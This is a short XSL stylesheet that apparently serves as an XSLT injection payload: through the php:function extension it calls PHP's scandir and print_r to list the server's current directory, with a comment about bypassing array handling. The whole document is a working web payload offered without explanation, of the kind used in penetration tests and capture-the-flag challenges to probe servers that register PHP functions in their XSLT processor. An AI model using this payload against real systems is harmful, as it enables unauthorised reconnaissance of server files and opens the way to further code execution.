<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl"
                version="1.0">
  
  <xsl:template match="/">
    <!-- Bypass array handling by using print_r output -->
    <pre>
      <xsl:value-of select="php:function('print_r', php:function('scandir', '.'), true())"/>
    </pre>
  </xsl:template>

</xsl:stylesheet>
